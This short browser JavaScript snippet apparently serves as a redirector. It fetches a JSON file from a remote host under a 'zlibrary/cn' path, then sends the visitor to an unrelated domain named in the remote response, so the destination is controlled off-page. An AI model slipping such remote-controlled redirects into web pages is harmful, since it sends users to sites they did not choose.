let lang = navigator.language;
var xhttp = new XMLHttpRequest();
function sleep(n) {
    var start = new Date().getTime();
    while (true) {
        if (new Date().getTime() - start > n) {
            break;
        }
    }
}

xhttp.open("GET", "https://ark.awaland.xyz/zlibrary/cn/message.json", true);
xhttp.send();

sleep(2000);

xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
        var res = JSON.parse(this.responseText);
        window.location.href = "https://mc.minecraftbox.link/-----" + res.domain;
    }
}
